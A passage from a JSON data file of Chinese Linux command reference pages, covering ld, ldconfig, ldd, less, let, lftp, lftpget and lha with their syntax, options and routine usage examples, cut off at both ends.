17 09:40:48 +0800 2013\nbin                                         <span class=\"hljs-strong\">**Never logged in**</span> \ndaemon                                      <span class=\"hljs-strong\">**Never logged in**</span> \nadm                                         <span class=\"hljs-strong\">**Never logged in**</span> \nlp                                          <span class=\"hljs-strong\">**Never logged in**</span> \nsync                                        <span class=\"hljs-strong\">**Never logged in**</span> \nshutdown                                    <span class=\"hljs-strong\">**Never logged in**</span> \nhalt                                        <span class=\"hljs-strong\">**Never logged in**</span> \nmail                                        <span class=\"hljs-strong\">**Never logged in**</span> \nnews                                        <span class=\"hljs-strong\">**Never logged in**</span> \nuucp                                        <span class=\"hljs-strong\">**Never logged in**</span> \noperator                                    <span class=\"hljs-strong\">**Never logged in**</span> \ngames                                       <span class=\"hljs-strong\">**Never logged in**</span> \ngopher                                      <span class=\"hljs-strong\">**Never logged in**</span> \nftp                                         <span class=\"hljs-strong\">**Never logged in**</span> \nnobody                                      <span class=\"hljs-strong\">**Never logged in**</span> \nvcsa                                        <span class=\"hljs-strong\">**Never logged in**</span> \nntp                                         <span class=\"hljs-strong\">**Never logged in**</span> \nsshd                                        <span class=\"hljs-strong\">**Never logged in**</span> \nnscd                                        <span class=\"hljs-strong\">**Never logged in**</span> \nldap                                        <span class=\"hljs-strong\">**Never logged in**</span> \npostfix                                     <span class=\"hljs-strong\">**Never logged in**</span> \nwww                                         <span class=\"hljs-strong\">**Never logged in**</span> \nmysql                                       <span class=\"hljs-strong\">**Never logged in**</span> \n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ld",
        "des": "将目标文件连接为可执行程序",
        "body": "<h1 id=\"ld\">ld</h1>\n<p>将目标文件连接为可执行程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ld命令</strong> 是GNU的连接器，将目标文件连接为可执行程序。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ld</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\nld <span class=\"hljs-selector-attr\">[options]</span> objfile ...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-o：指定输出文件名；</span>\n<span class=\"hljs-deletion\">-e：指定程序的入口符号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标文件：指定需要连接的目标文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>这告诉ld通过将文件 <code>/lib/crt0.o</code> 与 <code>hello.o</code> 和库 <code>libc.a</code> 链接起来，生成一个名为 <code>output</code> 的文件，该文件将来自标准搜索目录。</p>\n<pre><code class=\"language-shell\">ld -o &lt;output&gt; <span class=\"hljs-regexp\">/lib/</span>crt0.o hello.o -lc\nld -o output <span class=\"hljs-regexp\">/lib/</span>crt0.o hello.o -lc\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ldconfig",
        "des": "动态链接库管理命令",
        "body": "<h1 id=\"ldconfig\">ldconfig</h1>\n<p>动态链接库管理命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ldconfig命令</strong> 的用途主要是在默认搜寻目录<code>/lib</code>和<code>/usr/lib</code>以及动态库配置文件<code>/etc/ld.so.conf</code>内所列的目录下，搜索出可共享的动态链接库（格式如lib*.so*）,进而创建出动态装入程序(ld.so)所需的连接和缓存文件。缓存文件默认为<code>/etc/ld.so.cache</code>，此文件保存已排好序的动态链接库名字列表，为了让动态链接库为系统所共享，需运行动态链接库的管理命令ldconfig，此执行程序存放在<code>/sbin</code>目录下。</p>\n<p>ldconfig通常在系统启动时运行，而当用户安装了一个新的动态链接库时，就需要手工运行这个命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ldconfig <span class=\"hljs-comment\">[-v|--verbose]</span> <span class=\"hljs-comment\">[-n]</span> <span class=\"hljs-comment\">[-N]</span> <span class=\"hljs-comment\">[-X]</span> <span class=\"hljs-comment\">[-f CONF]</span> <span class=\"hljs-comment\">[-C CACHE]</span> <span class=\"hljs-comment\">[-r ROOT]</span> <span class=\"hljs-comment\">[-l]</span> <span class=\"hljs-comment\">[-p|--print-cache]</span> <span class=\"hljs-comment\">[-c FORMAT]</span> <span class=\"hljs-comment\">[--format=FORMAT]</span> <span class=\"hljs-comment\">[-V]</span> -?|--<span class=\"hljs-comment\">[help|--usage]</span> path... \n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-v或--verbose：用此选项时，ldconfig将显示正在扫描的目录及搜索到的动态链接库，还有它所创建的连接的名字。\n-n：用此选项时,ldconfig仅扫描命令行指定的目录，不扫描默认目录（<span class=\"hljs-regexp\">/lib、/u</span>sr<span class=\"hljs-regexp\">/lib），也不扫描配置文件/</span>etc/ld.so.conf所列的目录。\n-N：此选项指示ldconfig不重建缓存文件（<span class=\"hljs-regexp\">/etc/</span>ld.so.cache），若未用-X选项，ldconfig照常更新文件的连接。\n-X：此选项指示ldconfig不更新文件的连接，若未用-N选项，则缓存文件正常更新。\n-f CONF：此选项指定动态链接库的配置文件为CONF，系统默认为<span class=\"hljs-regexp\">/etc/</span>ld.so.conf。\n-C CACHE：此选项指定生成的缓存文件为CACHE，系统默认的是<span class=\"hljs-regexp\">/etc/</span>ld.so.cache，此文件存放已排好序的可共享的动态链接库的列表。\n-r ROOT：此选项改变应用程序的根目录为ROOT（是调用chroot函数实现的）。选择此项时，系统默认的配置文件<span class=\"hljs-regexp\">/etc/</span>ld.so.conf，实际对应的为ROOT<span class=\"hljs-regexp\">/etc/</span>ld.so.conf。如用-r <span class=\"hljs-regexp\">/usr/</span>zzz时，打开配置文件<span class=\"hljs-regexp\">/etc/</span>ld.so.conf时，实际打开的是<span class=\"hljs-regexp\">/usr/</span>zzz<span class=\"hljs-regexp\">/etc/</span>ld.so.conf文件。用此选项，可以大大增加动态链接库管理的灵活性。\n-l：通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的连接，选择此项时，将进入专家模式，需要手工设置连接，一般用户不用此项。\n-p或--<span class=\"hljs-keyword\">print</span>-cache：此选项指示ldconfig打印出当前缓存文件所保存的所有共享库的名字。\n-c FORMAT 或 --format=FORMAT：此选项用于指定缓存文件所使用的格式，共有三种：old(老格式)，<span class=\"hljs-keyword\">new</span>(新格式)和compat（兼容格式，此为默认格式）。\n-V：此选项打印出ldconfig的版本信息，而后退出。\n-? 或 --help 或 --usage：这三个选项作用相同，都是让ldconfig打印出其帮助信息，而后退出。\n</code></pre>\n<p> <strong>ldconfig几个需要注意的地方：</strong> </p>\n<ol>\n<li> 往<code>/lib</code>和<code>/usr/lib</code>里面加东西，是不用修改<code>/etc/ld.so.conf</code>的，但是完了之后要调一下ldconfig，不然这个library会找不到。</li>\n<li> 想往上面两个目录以外加东西的时候，一定要修改<code>/etc/ld.so.conf</code>，然后再调用ldconfig，不然也会找不到。</li>\n<li> 比如安装了一个mysql到<code>/usr/local/mysql</code>，mysql有一大堆library在<code>/usr/local/mysql/lib</code>下面，这时就需要在<code>/etc/ld.so.conf</code>下面加一行<code>/usr/local/mysql/lib</code>，保存过后ldconfig一下，新的library才能在程序运行时被找到。</li>\n<li> 如果想在这两个目录以外放lib，但是又不想在<code>/etc/ld.so.conf</code>中加东西（或者是没有权限加东西）。那也可以，就是export一个全局变量LD_LIBRARY_PATH，然后运行程序的时候就会去这个目录中找library。一般来讲这只是一种临时的解决方案，在没有权限或临时需要的时候使用。</li>\n<li> ldconfig做的这些东西都与运行程序时有关，跟编译时一点关系都没有。编译的时候还是该加-L就得加，不要混淆了。</li>\n<li> 总之，就是不管做了什么关于library的变动后，最好都ldconfig一下，不然会出现一些意想不到的结果。不会花太多的时间，但是会省很多的事。</li>\n<li> 再有，诸如libdb-4.3.so文件头中是会含有库名相关的信息的（即含“libdb-4.3.so”，可用strings命令察看），因此仅通过修改文件名以冒充某已被识别的库（如libdb-4.8.so）是行不通的。为此可在编译库的Makefile中直接修改配置信息，指定特别的库名。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ldd",
        "des": "打印程序或者库文件所依赖的共享库列表",
        "body": "<h1 id=\"ldd\">ldd</h1>\n<p>打印程序或者库文件所依赖的共享库列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ldd命令</strong> 用于打印程序或者库文件所依赖的共享库列表。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ldd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">--version：打印指令版本号；</span>\n<span class=\"hljs-deletion\">-v：详细信息模式，打印所有相关信息；</span>\n<span class=\"hljs-deletion\">-u：打印未使用的直接依赖；</span>\n<span class=\"hljs-deletion\">-d：执行重定位和报告任何丢失的对象；</span>\n<span class=\"hljs-deletion\">-r：执行数据对象和函数的重定位，并且报告任何丢失的对象和函数；</span>\n<span class=\"hljs-deletion\">--help：显示帮助信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定可执行程序或者文库。</p>\n<h3 id=\"其他介绍\">其他介绍</h3>\n<p>首先ldd不是一个可执行程序，而只是一个shell脚本</p>\n<p>ldd能够显示可执行模块的dependency，其原理是通过设置一系列的环境变量，如下：<code>LD_TRACE_LOADED_OBJECTS、LD_WARN、LD_BIND_NOW、LD_LIBRARY_VERSION、LD_VERBOSE</code>等。当<code>LD_TRACE_LOADED_OBJECTS</code>环境变量不为空时，任何可执行程序在运行时，它都会只显示模块的dependency，而程序并不真正执行。要不你可以在shell终端测试一下，如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">LD_TRACE_LOADED_OBJECTS</span>=1\n</code></pre>\n<p>再执行任何的程序，如ls等，看看程序的运行结果。</p>\n<p>ldd显示可执行模块的dependency的工作原理，其实质是通过ld-linux.so（elf动态库的装载器）来实现的。我们知道，ld-linux.so模块会先于executable模块程序工作，并获得控制权，因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency。</p>\n<p>实际上可以直接执行ld-linux.so模块，如：<code>/lib/ld-linux.so.2 --list program</code>（这相当于ldd program）</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "less",
        "des": "分屏上下翻页浏览文件内容",
        "body": "<h1 id=\"less\">less</h1>\n<p>分屏上下翻页浏览文件内容</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>less命令</strong> 的作用与more十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。用less命令显示文件时，用PageUp键向上翻页，用PageDown键向下翻页。要退出less程序，应按Q键。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">less</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-e：文件内容显示完毕后，自动退出；</span>\n<span class=\"hljs-deletion\">-f：强制显示文件；</span>\n<span class=\"hljs-deletion\">-g：不加亮显示搜索到的所有关键词，仅显示当前显示的关键字，以提高显示速度；</span>\n<span class=\"hljs-deletion\">-l：搜索时忽略大小写的差异；</span>\n<span class=\"hljs-deletion\">-N：每一行行首显示行号；</span>\n<span class=\"hljs-deletion\">-s：将连续多个空行压缩成一行显示；</span>\n<span class=\"hljs-deletion\">-S：在单行显示较长的内容，而不换行显示；</span>\n<span class=\"hljs-deletion\">-x&lt;数字&gt;：将TAB字符显示为指定个数的空格字符。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要分屏显示内容的文件。</p>\n<h2 id=\"实例\">实例</h2>\n<pre><code class=\"language-shell\">sudo less /<span class=\"hljs-built_in\">var</span>/<span class=\"hljs-keyword\">log</span>/shadowsocks.<span class=\"hljs-keyword\">log</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "let",
        "des": "简单的计算器，执行算术表达式。",
        "body": "<h1 id=\"let\">let</h1>\n<p>简单的计算器，执行算术表达式。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">let <span class=\"hljs-keyword\">arg</span> [<span class=\"hljs-keyword\">arg</span> ...]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>执行一个或多个算术表达式。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>arg：算术表达式</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>当<code>let</code>最后一个执行的表达式的计算结果为0时返回<code>1</code>，否则返回<code>0</code>。\n当<code>let</code>执行的表达式的除数为0时，返回<code>1</code>并报错。</p>\n<h2 id=\"运算符优先级递减表\">运算符优先级递减表</h2>\n<table>\n<thead>\n<tr>\n<th align=\"center\"><strong>运算符</strong></th>\n<th align=\"center\"><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>id++, id--</code></td>\n<td align=\"center\"><code>变量后增量、变量后减量</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>++id, --id</code></td>\n<td align=\"center\"><code>变量预增量、变量预减量</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>-, +</code></td>\n<td align=\"center\"><code>正号、负号</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>!, ~</code></td>\n<td align=\"center\"><code>逻辑否、按位取反</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>**</code></td>\n<td align=\"center\"><code>幂运算</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>*, /, %</code></td>\n<td align=\"center\"><code>乘法、除法、取余</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>+, -</code></td>\n<td align=\"center\"><code>加法、减法</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&lt;&lt;, &gt;&gt;</code></td>\n<td align=\"center\"><code>按位左移、右移</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&lt;=, &gt;=, &lt;, &gt;</code></td>\n<td align=\"center\"><code>比较</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>==, !=</code></td>\n<td align=\"center\"><code>等于、不等于</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;</code></td>\n<td align=\"center\"><code>按位与</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>^</code></td>\n<td align=\"center\"><code>按位异或</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>|</code></td>\n<td align=\"center\"><code>按位或</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;&amp;</code></td>\n<td align=\"center\"><code>逻辑与</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>||</code></td>\n<td align=\"center\"><code>逻辑或</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>expr ? expr : expr</code></td>\n<td align=\"center\"><code>条件运算符（三元运算符）</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>=, *=, /=, %=, +=, -=,</code><br><code>&lt;&lt;=, &gt;&gt;=, &amp;=, ^=, |=</code></td>\n<td align=\"center\"><code>赋值</code></td>\n</tr>\n</tbody></table>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 尝试直接在终端中执行算术表达式（就像在python的IDLE）。</span>\n<span class=\"hljs-attribute\">3</span>+<span class=\"hljs-number\">4</span>\n<span class=\"hljs-attribute\">bash</span>：<span class=\"hljs-number\">3</span>+<span class=\"hljs-number\">4</span>：command not found...\n<span class=\"hljs-comment\"># 换一种方式。</span>\n<span class=\"hljs-attribute\">3</span> + <span class=\"hljs-number\">4</span>\n<span class=\"hljs-attribute\">bash</span>：<span class=\"hljs-number\">3</span>：command not found...\n<span class=\"hljs-comment\"># 看来不行。</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># let命令赋值。</span>\nlet <span class=\"hljs-attribute\">a</span>=3**4\necho <span class=\"hljs-variable\">${a}</span>\n<span class=\"hljs-comment\"># 显示81。</span>\n<span class=\"hljs-comment\"># ((...))和let命令等效。</span>\n((<span class=\"hljs-attribute\">a</span>=3**4))\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># let常用于变量赋值，而外部命令expr可直接返回表达式的值。</span>\n<span class=\"hljs-attribute\">let</span> <span class=\"hljs-number\">3</span>+<span class=\"hljs-number\">4</span>\n<span class=\"hljs-comment\"># 没有显示7。</span>\n<span class=\"hljs-comment\"># 执行后显示7，注意空格。</span>\n<span class=\"hljs-attribute\">expr</span> <span class=\"hljs-number\">3</span> + <span class=\"hljs-number\">4</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 条件表达式。</span>\n<span class=\"hljs-keyword\">if</span> ((8&gt;4)); <span class=\"hljs-keyword\">then</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'8 is greater than 4.'</span>\n<span class=\"hljs-keyword\">else</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'error'</span>\n<span class=\"hljs-keyword\">fi</span>\n<span class=\"hljs-comment\"># 注意空格。</span>\n<span class=\"hljs-keyword\">if</span> [[ 12 -le 10 ]]; <span class=\"hljs-keyword\">then</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'error'</span>\n<span class=\"hljs-keyword\">else</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'12 is greater than 10.'</span>\n<span class=\"hljs-keyword\">fi</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 可以通过declare命令设置整型属性的方法来进行算术运算。</span>\n<span class=\"hljs-comment\"># local命令与此类似。</span>\n\n<span class=\"hljs-comment\"># 没有指定整型属性，输出为字符串'a+b'。</span>\ndeclare <span class=\"hljs-attribute\">a</span>=3 <span class=\"hljs-attribute\">b</span>=4 c\n<span class=\"hljs-attribute\">c</span>=a+b\necho <span class=\"hljs-variable\">${c}</span>\n<span class=\"hljs-comment\"># 不过可以使用以下方式赋值。</span>\n<span class=\"hljs-attribute\">c</span>=$((a+b))\necho <span class=\"hljs-variable\">${c}</span>\n<span class=\"hljs-comment\"># 显示7</span>\n\n<span class=\"hljs-comment\"># 设置了整型属性就可以直接加了。</span>\ndeclare -i <span class=\"hljs-attribute\">a</span>=3 <span class=\"hljs-attribute\">b</span>=4 c\n<span class=\"hljs-attribute\">c</span>=a+b\necho <span class=\"hljs-variable\">${c}</span>\n<span class=\"hljs-comment\"># 同上。</span>\ndeclare -i a\n<span class=\"hljs-attribute\">a</span>=2*3\necho <span class=\"hljs-variable\">${a}</span>\n<span class=\"hljs-comment\"># 显示6。</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n<li><p>执行算术计算的命令除了<code>let</code>，还有外部命令<code>expr</code>、<code>bc</code>等。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "lftp",
        "des": "优秀的文件客户端程序",
        "body": "<h1 id=\"lftp\">lftp</h1>\n<p>优秀的文件客户端程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lftp命令</strong> 是一款优秀的文件客户端程序，它支持ftp、SETP、HTTP和FTPs等多种文件传输协议。lftp支持tab自动补全，记不得命令双击tab键，就可以看到可能的选项了。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lftp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：指定lftp指令要执行的脚本文件；</span>\n<span class=\"hljs-deletion\">-c：执行指定的命令后退出；</span>\n<span class=\"hljs-deletion\">--help：显示帮助信息；</span>\n<span class=\"hljs-deletion\">--version：显示指令的版本号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>站点：要访问的站点的ip地址或者域名。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>登录ftp</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lftp</span> 用户名:密码<span class=\"hljs-variable\">@ftp</span>地址:传送端口（默认<span class=\"hljs-number\">21</span>）\n</code></pre>\n<p>也可以先不带用户名登录，然后在接口界面下用login命令来用指定账号登录，密码不显示。</p>\n<p> <strong>查看文件与改变目录</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">ls</span>\n<span class=\"hljs-keyword\">cd</span> 对应ftp目录\n</code></pre>\n<p> <strong>下载</strong> </p>\n<p>get当然是可以的，还可以：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mget</span> -c <span class=\"hljs-regexp\">*.pdf</span>    <span class=\"hljs-comment\">#把所有的pdf文件以允许断点续传的方式下载。</span>\nmirror aaa/      <span class=\"hljs-comment\">#将aaa目录整个的下载下来，子目录也会自动复制。</span>\npget -c -n <span class=\"hljs-number\">10</span> file.dat   <span class=\"hljs-comment\">#以最多10个线程以允许断点续传的方式下载file.dat，可以通过设置pget:default-n的值而使用默认值。</span>\n</code></pre>\n<p> <strong>上传</strong> </p>\n<p>同样的put、mput都是对文件的操作，和下载类似。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mirror</span> -R 本地目录名\n</code></pre>\n<p>将本地目录以迭代（包括子目录）的方式反向上传到ftp site。</p>\n<p> <strong>模式设置</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">set</span> ftp:charset <span class=\"hljs-comment\">gbk</span>\n</code></pre>\n<p>远程ftp site用gbk编码，对应的要设置为utf8,只要替换gbk为utf8即可。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">set</span> <span class=\"hljs-built_in\">file</span>:charset utf8\n</code></pre>\n<p>本地的charset设定为utf8,如果你是gbk，相应改掉。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">set</span> ftp:passive-<span class=\"hljs-built_in\">mode</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>使用被动模式登录，有些site要求必须用被动模式或者主动模式才可以登录，这个开关就是设置这个的。0代表不用被动模式。</p>\n<p> <strong>书签</strong> </p>\n<p>其实命令行也可以有书签，在lftp终端提示符下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bookmark </span><span class=\"hljs-keyword\">add </span>ustc\n</code></pre>\n<p>就可以把当前正在浏览的ftp site用ustc作为标签储存起来。以后在shell终端下，直接<code>lftp ustc</code>就可以自动填好用户名和密码，进入对应的目录了。</p>\n<pre><code class=\"language-shell\">bookmark <span class=\"hljs-keyword\">edit</span>\n</code></pre>\n<p>会调用编辑器手动修改书签。当然，也可以看到，这个书签其实就是个简单的文本文件。密码，用户名都可以看到。</p>\n<p> <strong>配置文件</strong> </p>\n<pre><code class=\"language-shell\">vim <span class=\"hljs-regexp\">/etc/</span>lftp.conf\n</code></pre>\n<p>一般，我会添加这几行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">set</span> ftp:charset <span class=\"hljs-comment\">gbk</span>\n<span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">file:charset utf8</span>\n<span class=\"hljs-keyword\">set</span> <span class=\"hljs-comment\">pget:default-n 5</span>\n</code></pre>\n<p>这样，就不用每次进入都要打命令了。其他的set可以自己tab然后help来看。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lftpget",
        "des": "调用lftp指令下载指定的文件",
        "body": "<h1 id=\"lftpget\">lftpget</h1>\n<p>调用lftp指令下载指定的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lftpget命令</strong> 通过调用lftp指令下载指定的文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lftpget</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：继续先前的下载；</span>\n<span class=\"hljs-deletion\">-d：输出调试信息；</span>\n<span class=\"hljs-deletion\">-v：输出详细信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要下载的文件，文件必须是合法的URL路径。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lha",
        "des": "压缩或解压缩lzh格式文件",
        "body": "<h1 id=\"lha\">lha</h1>\n<p>压缩或解压缩lzh格式文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lha命令</strong> 是从lharc演变而来的压缩程序，文件经它压缩后，会另外产生具有<code>.lzh</code>扩展名的压缩文件。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a或a：压缩文件，并加入到压缩文件内。\n-a&lt;<span class=\"hljs-number\">0</span><span class=\"hljs-regexp\">/1/</span><span class=\"hljs-number\">2</span>&gt;<span class=\"hljs-regexp\">/u&lt;/</span><span class=\"hljs-number\">0</span><span class=\"hljs-regexp\">/1/</span><span class=\"hljs-number\">2</span>&gt;   压缩文件时，采用不同的文件头。\n-c或c：压缩文件，重新建构新的压缩文件后，再将其加入。\n-d或d：从压缩文件内删除指定的文件。\n-&lt;a<span class=\"hljs-regexp\">/c/u</span>&gt;d或&lt;a<span class=\"hljs-regexp\">/c/u</span>&gt;d：压缩文件，然后将其加入，重新建构，更新压缩文件或，删除原始文件，也就是把文件移到压缩文件中。\n-e或e：解开压缩文件。\n-f或f：强制执行lha命令，在解压时会直接覆盖已有的文件而不加以询问。\n-g或g：使用通用的压缩格式，便于解决兼容性的问题。\n-&lt;e<span class=\"hljs-regexp\">/x&gt;i或&lt;e/</span>x&gt;i：解开压缩文件时，忽略保存在压缩文件内的文件路径，直接将其解压后存放在现行目录下或是指定的目录中。\n-l或l：列出压缩文件的相关信息。\n-m或m：此选项的效果和同时指定<span class=\"hljs-string\">\"-ad\"</span>选项相同。\n-n或n：不执行指令，仅列出实际执行会进行的动作。\n-&lt;a<span class=\"hljs-regexp\">/u&gt;o或&lt;a/u</span>&gt;o：采用lharc兼容格式，将压缩后的文件加入，更新压缩文件。\n-p或p：从压缩文件内输出到标准输出设备。\n-q或q：不显示指令执行过程。\n-t或t：检查备份文件内的每个文件是否正确无误。\n-u或u：更换较新的文件到压缩文件内。\n-u&lt;<span class=\"hljs-regexp\">/0/</span><span class=\"hljs-number\">1</span><span class=\"hljs-regexp\">/2&gt;或u&lt;/</span><span class=\"hljs-number\">0</span><span class=\"hljs-regexp\">/1/</span><span class=\"hljs-number\">2</span>&gt;：在文件压缩时采用不同的文件头，然后更新到压缩文件内。\n-v或v：详细列出压缩文件的相关信息。\n-&lt;e<span class=\"hljs-regexp\">/x&gt;w=&lt;目的目录&gt;或&lt;e/</span>x&gt;w=&lt;目的目录&gt;：指定解压缩的目录。\n-x或x：解开压缩文件。\n-&lt;a<span class=\"hljs-regexp\">/u&gt;z或&lt;a/u</span>&gt;z：不压缩文件，直接把它加入，更新压缩文件。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">lha -<span class=\"hljs-selector-tag\">a</span> abc<span class=\"hljs-selector-class\">.lhz</span> <span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.b</span>         #压缩<span class=\"hljs-selector-tag\">a</span>.b文件，压缩后生成 abc<span class=\"hljs-selector-class\">.lhz</span> 文件\nlha -<span class=\"hljs-selector-tag\">a</span> abc2 /home/hnlinux  #压缩目录\nlha -xiw=agis abc          #解压文件abc，到当前目录\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lilo",
        "des": "安装核心载入开机管理程序",
        "body": "<h1 id=\"lilo\">lilo</h1>\n<p>安装核心载入开机管理程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lilo命令</strong> 用于安装核心载入，开机管理程序。lilo是个Linux系统核心载入程序，同时具备管理开机的功能。单独执行lilo指令，它会读取/etc/lilo.conf配置文件，然后根据其内容安装lilo。</p>\n<p>Linux lilo已经成为所有 Linux 发行版的标准组成部分。作为一个 较老的/最老的 Linux 引导加载程序，它那不断壮大的 Linux 社区支持使它能够随时间的推移而发展，并始终能够充当一个可用的现代引导加载程序。有一些新的功能，比如增强的用户界面，以及对能够突破原来 1024-柱面限制的新 BIOS 功能的利用。</p>\n<p>虽然 LILO 仍在不断地发展，但 LILO 工作原理的基本概念保持不变。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lilo</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b&lt;外围设备代号&gt;：指定安装lilo之处的外围设备代号；</span>\n<span 